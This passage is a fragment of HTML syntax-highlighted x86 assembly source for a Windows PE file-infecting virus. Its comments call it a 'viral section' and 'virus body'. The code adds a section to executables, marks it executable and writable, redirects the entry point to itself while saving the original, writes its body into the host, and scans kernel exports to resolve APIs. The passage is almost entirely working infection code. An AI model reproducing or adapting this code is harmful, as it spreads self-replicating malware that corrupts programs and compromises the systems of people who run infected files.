    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; section</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">    </span><span class="sc1">; look if that's really</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseFile</span><span class="sc0">           </span><span class="sc1">; a Portable exe</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; edx equal the offset of the</span><span class="sc0">
                        </span><span class="sc1">; header</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; ax = number of section</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;add 1 to the number of section</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; now we have to found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">             </span><span class="sc1">; the offset of the last </span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; section to drop our </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; viral section</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; then Esi equal where we drop</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">0f8h</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; point esi to our buffer</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'00t.'</span><span class="sc0">      </span><span class="sc1">; look if we are already here</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; fucking lame stack optimization</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">           </span><span class="sc1">; then close file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; copy the previous section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; now edi point to the section</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">InputToHost</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; and ESI to the '.Star0' </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; string , set the name of</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; our section</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; esi point to the last section</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; and edi to our viral section</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; calculate the </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; new RVA of the</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; viral section</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Divit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; keep original entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReturnToHost</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; point</span><span class="sc0">
</span><span class="sc1">;   add eax,3               ; forgot to delete that line :[</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; set ENtry point to</span><span class="sc0">
                            </span><span class="sc1">; viral RVA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; calculate virtual</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">              </span><span class="sc1">; size in order of</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Divit</span><span class="sc0">                   </span><span class="sc1">; the object align</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get the offset of the last</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; plus his size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; and that physical offset of</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; our virus</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; calculate physical</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">            </span><span class="sc1">; in order with size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Divit</span><span class="sc0">                   </span><span class="sc1">; align</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save it in our viral</span><span class="sc0">
                            </span><span class="sc1">; section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
                    </span><span class="sc1">; set the viral section flags</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; add to the image </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; size our virus size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Divit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save it</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">               </span><span class="sc1">; seek to previewved</span><span class="sc0">
                            </span><span class="sc1">; endoffile</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">            </span><span class="sc1">; we copy virus image</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start0</span><span class="sc0">           </span><span class="sc1">; to stack</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; too lazy to alloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                 </span><span class="sc1">; memory</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start0</span><span class="sc0">           </span><span class="sc1">; the start of the</span><span class="sc0">
                            </span><span class="sc1">; virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; our new entrypoint</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; will be destination</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">makefixup</span><span class="sc0">               </span><span class="sc1">; apply relocations</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">            </span><span class="sc1">; write physical image</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write_file</span><span class="sc0">              </span><span class="sc1">; write the virus body</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">            </span><span class="sc1">; restore stack</span><span class="sc0">

</span><span class="sc1">; --</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; seek to the header</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">0F8h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Write_file</span><span class="sc0">              </span><span class="sc1">; drop the header</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Close_file</span><span class="sc0">              </span><span class="sc1">; close the file</span><span class="sc0">

</span><span class="sc5">Finished</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetProc</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; kernel scanner</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">kernelbase</span><span class="sc0">          </span><span class="sc1">; prerecorded address of the</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; kernel</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">badpoint</span><span class="sc0">            </span><span class="sc1">; verify if it's exe</span><span class="sc0">
                        </span><span class="sc1">; but it should allways</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; look at [3Ch]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">        </span><span class="sc1">; if it's PE but it should </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">badpoint</span><span class="sc0">            </span><span class="sc1">; allways</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get the export RVA and set</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; to edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ecx equal number of exports</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ebx point to name pointer table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; so ebx point to the pointer table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; ebp is the offset of the asked API</span><span class="sc0">

</span><span class="sc5">Scanstring</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; this procedure look if the asked</span><span class="sc0">
                    </span><span class="sc1">; api name are equal of the current</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; scanned api name , but we test </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; just 4 bytes to gain speed</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">TestName</span><span class="sc0">
    
</span><span class="sc5">Heresebx</span><span class="sc4">:</span><span class="sc0">   

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">; if not then set again ebp </span><span class="sc0">
                    </span><span class="sc1">; if we had tests fail (in TestName)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; and test the next Kernel API</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; if ecx are finish the scan fuckup!</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Scanstring</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; return with error code</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">badpoint</span><span class="sc0">

</span><span class="sc5">TestName</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; here we test all the name </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; there's some ApiDoSomethingA who</span><span class="sc0">
                    </span><span class="sc1">; have a brother ApiDoSomethingW</span><span class="sc0">
</span><span class="sc5">TestName0</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; test the byte</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Heresebx</span><span class="sc0">        </span><span class="sc1">; and if not equal then byebye</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; if we have zero then everything are</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">TestName0</span><span class="sc0">       </span><span class="sc1">; okkkkkkkkkkkkayyyyyyyyyyyyy</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; test last byte if okay </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; if not failed</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Heresebx</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; so we have in edx+2 the ordinal of</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; the api</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; this is set to get the api , I don't</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; really remember how I did that </span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; it was quite complex</span><span class="sc0">
    
